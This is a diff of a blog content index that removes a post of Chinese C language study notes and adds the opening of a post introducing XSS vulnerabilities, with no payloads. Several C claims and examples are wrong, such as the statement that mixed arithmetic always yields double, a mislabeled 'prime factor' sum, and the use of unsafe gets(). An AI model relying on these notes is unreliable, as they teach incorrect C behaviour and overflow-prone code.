-<p>十六进制：0X开头（0<del>9，A</del>F）</p>
-<p>2.float  4字节 有效数字6</p>
-<p>   double  8字节 有效数字15</p>
-<p>不同类型数据运算时，除强制类型转换外，结果都为double型</p>
-<p>在一个整数末尾加L&#x2F;l表示长整型</p>
-<p>eg. int b&#x3D;5;</p>
-<p>​      float a&#x3D;2.0;</p>
-<p>​      b&#x3D;b&#x2F;2*a; &#x2F;&#x2F;b&#x3D;5</p>
-<p>3.素数中：不必被2<del>（n-1）整除，只需被2</del>✓n即可，j*j&lt;i</p>
-<p>4.a%b结果由a的正负性决定，只要a为负数，结果为负数</p>
-<p>5.常量和常变量</p>
-<p>常变量：在定义变量时，加一个const</p>
-<p>​            eg.const int a&#x3D;3;</p>
-<p>变量：</p>
-<p>（1）整型变量 1000</p>
-<p>（2）实型变量 12.34e3</p>
-<p>（3）字符常量（只能为一个字符,’ \42 ‘为一个字符）</p>
-<p>​       1）普通字符：以ASCII码存储</p>
-<p>​                                常见的ASCII：’A’ &#x3D;65   ‘a’ &#x3D;97   0 &#x3D;48</p>
-<p>​       2）转义字符：以’ \ ‘开头，将’ \ ‘后的字符转化为另外意思</p>
-<p>​                             eg.’ \x41 ‘表示16进制41的ASCII字符，即’ A ‘</p>
-<p>​       3）字符串常量：“boy”</p>
-<p>​       4）符号常量（不能对其赋新值）：#define PI 3.1416</p>
-<p>6.标识符：只由字母，数字，下划线组成；第一个字符必须是字母或下划线</p>
-<p>7.unsigned int &#x3D;&gt;无符号整型  输出用%u</p>
-<p>   （充分利用变量的值的范围（数据范围只有正值））</p>
-<p>8.逗号表达式结果取后面的值</p>
-<p>  eg.i&#x3D;(a&#x3D;6,a*5),a+6;&#x2F;&#x2F;&gt;i&#x3D;30</p>
-<p>9.要输出%应该连续使用2个%</p>
-<p>10.字符变量</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char c=&#x27; ? &#x27;;</span><br><span class="line">printf(&quot;%d %c&quot;,c,c);</span><br><span class="line">=&gt;63 ?</span><br></pre></td></tr></table></figure>
-
-<p>11.i++和++i</p>
-<p>i&#x3D;3;</p>
-<p>j&#x3D;i++(i&#x3D;4,j&#x3D;3)&#x2F;&#x2F;先赋值后自加</p>
-<p>j&#x3D;++i(i&#x3D;4,j&#x3D;4)&#x2F;&#x2F;先自加在赋值</p>
-<p>12.输出：</p>
-<p>用%f得到6位小数</p>
-<p>%-m.nf ：</p>
-<p>​	   -号为左对齐</p>
-<p>​	  m为最小宽度：输出的总宽度（包括小数点、小数部分和整数部分）如果实际数据长度小于 m，将用空格填充；如果数据长度超过 				     m，则按实际长度输出，不截断</p>
-<p>​	  n为小数小数位数：如果实际小数位数超过 n，会进行四舍五入；如果不足n，会用0补足</p>
-<p>%e指定以指数形式输出实数，自动给出数字部分小数位数为6位，指数部分占5列</p>
-<p>eg.1.234560 e+002</p>
-<p>13.运算符优先级</p>
-<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250117135802930.png"></p>
-<p>14.字符（一个）输入输出：</p>
-<p>getchar  putchar(c)</p>
-<p>15.在判断一个量是否为真时，0为假，非0为真</p>
-<p>a&amp;&amp;b&#x2F;&#x2F;a和b都非0（只有a为真时，才需要判别b的值）</p>
-<p>a||b&#x2F;&#x2F;a和b至少一个非0（只有a为假时才需要判别b的值）</p>
-<p>16.判断非闰年：</p>
-<p><code>!((year%4==0&amp;&amp;year%100!=0)||year%400==0)</code></p>
-<p>17.两个数乘积&#x3D;两个数最大公约数 x 最小公倍数</p>
-<h2 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h2><h3 id="？：表达式（代替复杂的if）"><a href="#？：表达式（代替复杂的if）" class="headerlink" title="？：表达式（代替复杂的if）"></a>？：表达式（代替复杂的if）</h3><p>max&#x3D;(a&gt;b)?a:b;&#x2F;&#x2F;a&gt;b为真的话，max&#x3D;a，否则为b</p>
-<h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><p>switch(表达式){</p>
-<p>​	case 常量1:语句1;</p>
-<p>​	……</p>
-<p>​	default:……;</p>
-<p>}</p>
-<h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><h3 id="while语句"><a href="#while语句" class="headerlink" title="while语句"></a>while语句</h3><p>只要循环条件表达式为真时，就执行</p>
-<p>eg.while(i–)&#x2F;&#x2F;每次循环开始先检查i当前值是否为真，若为真，循环继续，每次循环结束时i值减少一</p>
-<h3 id="do-while语句"><a href="#do-while语句" class="headerlink" title="do while语句"></a>do while语句</h3><p>先无条件执行，再判断循环条件是否成立</p>
-<h3 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h3><p>for(…;…[只要值为真，就执行循环];…)</p>
-<h3 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h3><p>break：提前终止循环</p>
-<p>continue：提前结束本次循环，接着执行下次循环</p>
-<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p><code>a[3][4]</code> &#x3D;&gt;3行4列</p>
-<h3 id="字符数组"><a href="#字符数组" class="headerlink" title="字符数组"></a>字符数组</h3><h4 id="字符串结束标志"><a href="#字符串结束标志" class="headerlink" title="字符串结束标志"></a>字符串结束标志</h4><p>一个字符串以字符<code>&#39;\0&#39;</code>作为结束标志（c语言在字符数组储存字符串常量市会自动加一个’\0’作结束符）</p>
-<h4 id="字符数组的输入输出"><a href="#字符数组的输入输出" class="headerlink" title="字符数组的输入输出"></a>字符数组的输入输出</h4><p>%s &#x3D;&gt;整个字符串</p>
-<p>%c &#x3D;&gt;一个字符</p>
-<p>输出时遇到’\0’就停止输出</p>
-<p>scanf输入项如果是字符数组名，不加&amp;</p>
-<p>scanf读取字符串时，会在遇空白字符时停止读取</p>
-<h5 id="单行字符串"><a href="#单行字符串" class="headerlink" title="单行字符串"></a>单行字符串</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while((ch=getchar())!=&#x27;\n&#x27;)&#123;</span><br><span class="line">	a[i]=ch;</span><br><span class="line">	i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char string[100];</span><br><span class="line">char c;</span><br><span class="line">gets(string);</span><br><span class="line">for(int i=0;(c=string[i])!=&#x27;\0&#x27;;i++)&#123;···&#125;\\遍历字符串中每个字符</span><br></pre></td></tr></table></figure>
-
-<h5 id="n行字符串"><a href="#n行字符串" class="headerlink" title="n行字符串"></a>n行字符串</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">getchar();</span><br><span class="line">char a[100];</span><br><span class="line">for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">	gets(a);</span><br><span class="line">	···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">getchar();</span><br><span class="line">char string[n][100];</span><br><span class="line">for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">	gets(string[i]);</span><br><span class="line">	for(int j=0;string[i][j]!=&#x27;\0&#x27;;j++)&#123;···&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="字符串处理函数"><a href="#字符串处理函数" class="headerlink" title="字符串处理函数"></a>字符串处理函数</h4><p>记得加<code>#include&lt;string.h&gt;</code></p>
-<h5 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h5><p>输出的字符串中可以包含转义字符</p>
-<p>e.g </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char str[]=&#123;&quot;abc \n def&quot;&#125;;</span><br><span class="line">puts(str);</span><br><span class="line">   =&gt;abc</span><br><span class="line">     def</span><br></pre></td></tr></table></figure>
-
-<h5 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h5><p>从终端输入一个字符串到字符数组，并且得到一个函数值，该函数值是字符数组的起始地址</p>
-<p>注：gets和puts函数只能输入&#x2F;输出一个字符串</p>
-<h5 id="strcat"><a href="#strcat" class="headerlink" title="strcat"></a>strcat</h5><p>把两个字符数组中字符串连接起来</p>
-<p>strcat(str1,str2);</p>
-<h5 id="strcpy和strncpy"><a href="#strcpy和strncpy" class="headerlink" title="strcpy和strncpy"></a>strcpy和strncpy</h5><p>字符串复制函数</p>
-<h6 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h6><p>将字符串2复制到字符数组1中</p>
-<p>注：赋值语句只能将一个字符赋给一个字符型变量&#x2F;字符数组元素</p>
-<h6 id="strncpy"><a href="#strncpy" class="headerlink" title="strncpy"></a>strncpy</h6><p>将字符串2中前n个字符复制到字符数组1中</p>
-<p>strncpy(str1,str2,2);&#x2F;&#x2F;将str2前2个取代str1原有的2个</p>
-<h5 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h5><p>字符串比较：2个字符串从左到右逐个比较（ASCII值），直到出现不同字符或遇到’\0’为止</p>
-<p>字符串1&#x3D;字符串2  函数值为0</p>
-<p>字符串1&gt;字符串2  函数值为正整数</p>
-<p>字符串1&lt;字符串2  函数值为负整数</p>
-<h5 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h5><p>测字符串长度</p>
-<h5 id="strlwr"><a href="#strlwr" class="headerlink" title="strlwr"></a>strlwr</h5><p>转换为小写</p>
-<h5 id="strupr"><a href="#strupr" class="headerlink" title="strupr"></a>strupr</h5><p>转换为大写</p>
-<h4 id="头文件"><a href="#头文件" class="headerlink" title="&lt;ctype.h&gt;头文件"></a>&lt;ctype.h&gt;头文件</h4><p>isalpha判断一个字符是否是字母</p>
-<p>isdigit判断一个字符是否是数字</p>
-<p>islower判断一个字符是否是小写字母</p>
-<p>isupper判断一个字符是否是大写字母</p>
-<p>isspace判断一个字符是否是空白字符</p>
-<p>tolower将字符大写变小写</p>
-<p>toupper将字符小写变大写</p>
-<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="函数的定义与声明"><a href="#函数的定义与声明" class="headerlink" title="函数的定义与声明"></a>函数的定义与声明</h3><p>在定义函数时要指定函数的类型</p>
-<p>函数类型决定返回值类型</p>
-<p>用函数原型（函数首部）作函数声明</p>
-<p>e.g int add(int a,int b);</p>
-<h3 id="函数的嵌套"><a href="#函数的嵌套" class="headerlink" title="函数的嵌套"></a>函数的嵌套</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int max4(int a,int b,int c,int d)&#123;</span><br><span class="line">	int max2(int a,int b);</span><br><span class="line">	return max2(max2(max2(a,b),c),d);</span><br><span class="line">&#125;</span><br><span class="line">int max2(int a,int b)&#123;</span><br><span class="line">	return(a&gt;=b?a:b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="局部与全局变量"><a href="#局部与全局变量" class="headerlink" title="局部与全局变量"></a>局部与全局变量</h3><p>注：全局变量开头一般用大写字母，来区别局部变量</p>
-<h4 id="static"><a href="#static" class="headerlink" title="static"></a>static</h4><p>静态局部&#x2F;全局变量</p>
-<p>函数中局部变量的值在函数调用结束后不消失而继续保留本次调用结束后的值</p>
-<p>e.g <code>static int f=1;</code></p>
-<h4 id="extern"><a href="#extern" class="headerlink" title="extern"></a>extern</h4><p>外部变量声明</p>
-<p>在一个文件内扩展外部变量的作用域</p>
-<p>将外部变量的作用域扩展到其他文件</p>
-<p>e.g <code>extern A,B,C; \ \可省略int等类型</code></p>
-<h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><h3 id="指针变量"><a href="#指针变量" class="headerlink" title="指针变量"></a>指针变量</h3><p>指针是一个地址，而指针变量是存放地址的变量</p>
-<p>指针变量中只能存放地址（指针），不要将一个整数给指针变量</p>
-<p>p&#x3D;&a;</p>
-<p>*p&#x3D;1;\ \将1赋值给p所指向的变量即把1赋给a</p>
-<p>定义：类型名 * 指针变量名</p>
-<p>​	int* point;      </p>
-<p>​	point&#x3D;&a;\ \等价于int* point&#x3D;&a;</p>
-<p>函数调用时不加*</p>
-<p>e.g swap(point_1,point_2);</p>
-<p>为使在函数中改变的变量能被main所用，应该用指针变量做函数参数</p>
-<p>e.g</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void swap(int *p1,int *p2)&#123;</span><br><span class="line">	int temp;</span><br><span class="line">	temp=*p1;</span><br><span class="line">	*p1=*p2;</span><br><span class="line">	*p2=temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="通过指针引用数组"><a href="#通过指针引用数组" class="headerlink" title="通过指针引用数组"></a>通过指针引用数组</h3><h4 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int *p;</span><br><span class="line">p=&amp;a[0];\\不能写成*p=&amp;a[0];</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p=&amp;a[0];</span><br><span class="line">p=a;\\p的值是数组a的首元素</span><br></pre></td></tr></table></figure>
-
-<p>如果指针元素p指向数组中的一个元素，则p+1指向同一数组的下个元素，p-1指向同一数组的上个元素</p>
-<p>如果p的初值为&amp;a[0]，则p+i&#x2F;a+i即a[i]的地址，*(p+i)&#x2F; *(a+i)是p+i&#x2F;a+i所指向的数组元素即a[i]</p>
-<p>两个地址不能相加</p>
-<p>若指针变量p1、p2都指向同一数组中的元素，p2-p1结果为(p2-p1)的值（地址之差）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int i,a[10];</span><br><span class="line">int* p=a;\\p初值是a，p指向a[0]</span><br><span class="line">for(i=0;i&lt;10;i++)scanf(&quot;%d&quot;,p++);</span><br><span class="line">p=a;\\重新使p指向a[0]</span><br><span class="line">for(i=0;i&lt;10;i++,p++)printf(&quot;%d&quot;,*p);</span><br></pre></td></tr></table></figure>
-
-<p>若a[0]&#x3D;3，++(*p) &#x3D;&gt;a[0]&#x3D;4</p>
-<p>fun(int arr[],int n)  &#x3D;  fun(int* arr,int n)</p>
-<h4 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h4><p><code>*(a[i]+j)</code>或 <code>*(*(a+i)+j)</code>是<code>a[i][j]</code>的值</p>
-<p>对于a是二维数组，则a[i]是一位数组名，他是一个地址，并不代表一个储存单元&#x2F;其中的值</p>
-<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250119103815734.png"></p>
-<p>int (*p)[4]定义包含4个元素的一维数组的指针变量</p>
-<p>e.g 有一个二维数组<code>int arr[3][4]</code>，可用int (*p)[4]来声明一个指针p指向这个二维数组某一行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int arr[3][4]=&#123;&#123;0,1,2,3&#125;,&#123;4,5,6,7&#125;,&#123;8,9,10,11&#125;&#125;;</span><br><span class="line">int (*p)[4]=&amp;arr[0];\\p指向arr某一行</span><br></pre></td></tr></table></figure>
-
-<h3 id="通过指针引用字符串"><a href="#通过指针引用字符串" class="headerlink" title="通过指针引用字符串"></a>通过指针引用字符串</h3><p>通过字符数组名&#x2F;字符指针变量可以输出一个字符串</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char* a,str[10];</span><br><span class="line">a=str;</span><br><span class="line">scanf(&quot;%s&quot;,a);</span><br></pre></td></tr></table></figure>
-
-<p>数组名虽代表地址，但它是常量，其值不可改变</p>
-<p>字符指针变量指向的字符串常量中的内容是不可被取代</p>
-<h3 id="指向函数的指针"><a href="#指向函数的指针" class="headerlink" title="指向函数的指针"></a>指向函数的指针</h3><p>函数名是一个指针（地址）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int (*p)(int,int)</span><br><span class="line">p=max;\\将函数入口地址赋给p</span><br><span class="line">c=(*p)(a,b);\\用*p代替函数名</span><br></pre></td></tr></table></figure>
-
-<p>char* p[6]包含6个指针的数值</p>
-<h2 id="用户自己建立数据类型"><a href="#用户自己建立数据类型" class="headerlink" title="用户自己建立数据类型"></a>用户自己建立数据类型</h2><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p>struct 结构体名{</p>
-<p>​	成员表列（类型名 成员名）;</p>
-<p>};</p>
-<p>引用结构体变量中成员的值：结构体变量名.成员名 e.gstudent1.num&#x3D;10010;</p>
-<p>不能通过输出结构体变量名来达到输出结构体变量所有成员的值</p>
-<p>若p指向一个结构体变量stu</p>
-<p>则 stu.num &lt;&#x3D;&gt; (*p).num &lt;&#x3D;&gt; p-&gt;num</p>
-<p>结构体数组读入不用加&amp;</p>
-<h3 id="共用体"><a href="#共用体" class="headerlink" title="共用体"></a>共用体</h3><p>union 共用体名{</p>
-<p>​	成员表列（类型名 成员名）;</p>
-<p>};</p>
-<h3 id="typedef声明新类型名"><a href="#typedef声明新类型名" class="headerlink" title="typedef声明新类型名"></a>typedef声明新类型名</h3><h1 id="C语言经典例题"><a href="#C语言经典例题" class="headerlink" title="C语言经典例题"></a>C语言经典例题</h1><h2 id="统计一个字符串中每个单词的字符数"><a href="#统计一个字符串中每个单词的字符数" class="headerlink" title="统计一个字符串中每个单词的字符数"></a>统计一个字符串中每个单词的字符数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	char c;</span><br><span class="line">	int count=0;\\用于统计当前单词的字符数</span><br><span class="line">	int first=1;\\用于标记是否是第一个输出的字符数，初始值为1，表示是第一个</span><br><span class="line">	while(scanf(&quot;%c&quot;,&amp;c)&amp;&amp;c!=&#x27;.&#x27;)&#123;</span><br><span class="line">		if(c==&#x27; &#x27;)&#123;\\如果读取到的字符是空格，说明当前单词结束</span><br><span class="line">			if(count&gt;0)&#123;\\如果count大于0，说明前面有单词字符被统计</span><br><span class="line">				if(!first)printf(&quot; &quot;);\\如果first为0（即不是第一个输出），则先输出一个空格作为分隔</span><br><span class="line">				printf(&quot;%d&quot;,count);</span><br><span class="line">				first=0;</span><br><span class="line">				count=0;\\重置count为0，准备统计下一个单词</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		else count++;\\如果读取到的字符不是空格，则count加1，继续统计当前单词的字符数</span><br><span class="line">	&#125;</span><br><span class="line">	if(count&gt;0)&#123;\\循环结束后，如果count大于0，说明最后一个单词的字符数还没有输出</span><br><span class="line">		if(!first)printf(&quot; &quot;);\\如果不是第一个输出，先输出一个空格</span><br><span class="line">		printf(&quot;%d&quot;,count);\\输出最后一个单词的字符数</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="统计3个字符串，并找出其中最大值"><a href="#统计3个字符串，并找出其中最大值" class="headerlink" title="统计3个字符串，并找出其中最大值"></a>统计3个字符串，并找出其中最大值</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	char str [3] [20];</span><br><span class="line">	char string[20];</span><br><span class="line">	for(int i=0;i&lt;3;i++)&#123;</span><br><span class="line">		gets(str[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	for(int i=0;i&lt;2;i++)&#123;</span><br><span class="line">		if(strcmp(str[i],str[i+1])&gt;0)strcpy(string,str[i]);</span><br><span class="line">		if(strcmp(str[i],str[i+1])&lt;=0)strcpy(string,str[i+1]);</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;%s&quot;,string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="字符串的复制（指针）"><a href="#字符串的复制（指针）" class="headerlink" title="字符串的复制（指针）"></a>字符串的复制（指针）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void copy_string(char* from,char* to)&#123;</span><br><span class="line">	while((*to=*from)!=&#x27;\0&#x27;)&#123;</span><br><span class="line">		to++;</span><br><span class="line">		from++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void copy_string(char* from,char* to)&#123;</span><br><span class="line">	while((*to++=*from++)!=&#x27;\0&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void copy_string(char* from,char* to)&#123;</span><br><span class="line">	while(*from!=&#x27;\0&#x27;)&#123;</span><br><span class="line">		*to++=*from++;</span><br><span class="line">		*to=&#x27;\0&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void selectSort(int arr[],int n)&#123;</span><br><span class="line">    int i,j,minIndex,temp;</span><br><span class="line">    for(i=0;i&lt;n-1;i++)&#123;  //外层循环控制排序趟数</span><br><span class="line">        minIndex=i;  //假设当前位置元素就是最小值</span><br><span class="line">        for (j=i+1;j&lt;n;j++)&#123;  //内层循环在剩余元素中找最小值</span><br><span class="line">            if(arr[j]&lt;arr[minIndex])minIndex=j;  //更新最小值索引</span><br><span class="line">        &#125;</span><br><span class="line">        if(minIndex!=i)&#123;  //如果找到更小的元素，进行交换</span><br><span class="line">            temp=arr[i];</span><br><span class="line">            arr[i]=arr[minIndex];</span><br><span class="line">            arr[minIndex]=temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="人数过半"><a href="#人数过半" class="headerlink" title="人数过半"></a>人数过半</h2><p>输入N个数，求出现次数超过总数一半的数。数据保证存在这个数。</p>
-<p>输入格式:</p>
-<p>第一行输入一个正整数N(N&lt;1000)；</p>
-<p>第二行输入N个数，每个数的绝对值不超过1e9。</p>
-<p>输出格式:</p>
-<p>输出一个数，即出现次数超过总数一半的数。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int n;</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">    int a[2000];</span><br><span class="line">    for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    int can=a[0];</span><br><span class="line">    int cnt=1;</span><br><span class="line">    for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">        if(cnt==0)&#123;</span><br><span class="line">            can=a[i];</span><br><span class="line">            cnt=1;</span><br><span class="line">        &#125;</span><br><span class="line">        else if(can==a[i])cnt++;</span><br><span class="line">        else cnt--;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;%d&quot;,can);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="n个数字中选出数字和最大的连续一段"><a href="#n个数字中选出数字和最大的连续一段" class="headerlink" title="n个数字中选出数字和最大的连续一段"></a>n个数字中选出数字和最大的连续一段</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int sum1=0,sum=-1000;</span><br><span class="line">   for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">       sum1=(sum1+a[i])&gt;a[i]?(sum1+a[i]):a[i];</span><br><span class="line">       if(sum1&gt;sum)sum=sum1;</span><br><span class="line">   &#125;</span><br><span class="line">   printf(&quot;%d&quot;,sum);</span><br></pre></td></tr></table></figure>
-
-<h2 id="结尾不输出空行"><a href="#结尾不输出空行" class="headerlink" title="结尾不输出空行"></a>结尾不输出空行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int flag=1;</span><br><span class="line">···</span><br><span class="line">if(!flag)printf(&quot;\n&quot;);</span><br><span class="line">flag=0;</span><br><span class="line">···\\输出···</span><br></pre></td></tr></table></figure>
-
-<h2 id="数组元素右移"><a href="#数组元素右移" class="headerlink" title="数组元素右移"></a>数组元素右移</h2><p>n个数，第i个数向右移m个整数变为a[(i+n-m)%n]</p>
-<h2 id="单词翻转"><a href="#单词翻转" class="headerlink" title="单词翻转"></a>单词翻转</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">char* r(char* s)&#123;</span><br><span class="line">	int len=strlen(s);</span><br><span class="line">	for(int i=0;i&lt;len/2;i++)&#123;</span><br><span class="line">		char t=s[i];</span><br><span class="line">		s[i]=s[len-1-i];</span><br><span class="line">		s[len-1-i]=t;</span><br><span class="line">	&#125;</span><br><span class="line">	return s;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">	char s[25];</span><br><span class="line">	while(scanf(&quot;%s&quot;,s)!=EOF)&#123; \\去除多余空格</span><br><span class="line">		printf(&quot;%s&quot;,r(s));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="10进制数n转化成m进制"><a href="#10进制数n转化成m进制" class="headerlink" title="10进制数n转化成m进制"></a>10进制数n转化成m进制</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int cnt=1,sum=0;</span><br><span class="line">while(n&gt;0)&#123;</span><br><span class="line">	t=n%m;</span><br><span class="line">	t*=cnt;</span><br><span class="line">	sum+=t;</span><br><span class="line">	n/=m;</span><br><span class="line">	cnt*=10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="求n的素数因子和"><a href="#求n的素数因子和" class="headerlink" title="求n的素数因子和"></a>求n的素数因子和</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(int i=1;i&lt;sqrt(n);i++)&#123;</span><br><span class="line">	if(n%i==0)&#123;</span><br><span class="line">		sum+=i;</span><br><span class="line">		if(n/i!=i)&#123;</span><br><span class="line">			sum+=n/i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="求a，b的最大公约数"><a href="#求a，b的最大公约数" class="headerlink" title="求a，b的最大公约数"></a>求a，b的最大公约数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m=a;</span><br><span class="line">n=b;</span><br><span class="line">while(n!=0)&#123;</span><br><span class="line">	t=m%n;</span><br><span class="line">	m=n;</span><br><span class="line">	n=t;</span><br><span class="line">&#125;\\m即为最大公约数</span><br></pre></td></tr></table></figure>
-
-<h2 id="将一个n位数反转"><a href="#将一个n位数反转" class="headerlink" title="将一个n位数反转"></a>将一个n位数反转</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int number,res=0,rem;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;number);</span><br><span class="line">while(number!=0)&#123;</span><br><span class="line">	rem=num%10;</span><br><span class="line">	res=res*10+rem;</span><br><span class="line">	number/=10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="杨辉三角"><a href="#杨辉三角" class="headerlink" title="杨辉三角"></a>杨辉三角</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	int rows,conf=1;</span><br><span class="line">	scanf(&quot;%d&quot;,&amp;rows);</span><br><span class="line">	for(int i=0;i&lt;rows;i++)&#123;</span><br><span class="line">		for(int space=1;space&lt;=rows-i-1;space++)&#123;</span><br><span class="line">			printf(&quot;  &quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		for(int j=0;j&lt;=i;j++)&#123;</span><br><span class="line">			if(j==0||i==0)conf=1;</span><br><span class="line">			else conf=conf*(i-j+1)/j;</span><br><span class="line">			printf(&quot;%4d &quot;,conf);</span><br><span class="line">		&#125;</span><br><span class="line">		printf(&quot;\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-</div>]]></content>
-      <categories>
-        <category>编程</category>
-      </categories>
-  </entry>
-  <entry>
     <title>MySQL</title>
     <url>/2025/02/05/MySQL/</url>
     <content><![CDATA[<div id="postchat_postcontent"><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><p>一个关系型数据库管理系统（RDBMS）</p>
@@ -3021,6 +2615,412 @@
 
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 </div>]]></content>
+  </entry>
+  <entry>
+    <title>XSS漏洞</title>
+    <url>/2025/02/05/XSS%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<div id="postchat_postcontent"><h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><p>XSS是基于<strong>前端</strong>的一种攻击，其实就是<strong>非Web应用自身的JS代码被黑客恶意插入</strong>，通过执行恶意的JS代码，可以导致<strong>窃取敏感信息、篡改网页内容或劫持用户会话</strong>，大部分情况是窃取Cookie，在你登录账号后的情况下，部分Web应用通过Cookie可以导致黑客能直接登录你的账号</p>
+<h2 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h2><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>持久化，代码存储在后端（数据库、日志文件、评论等）中，容易造成蠕虫，盗窃cookie</p>
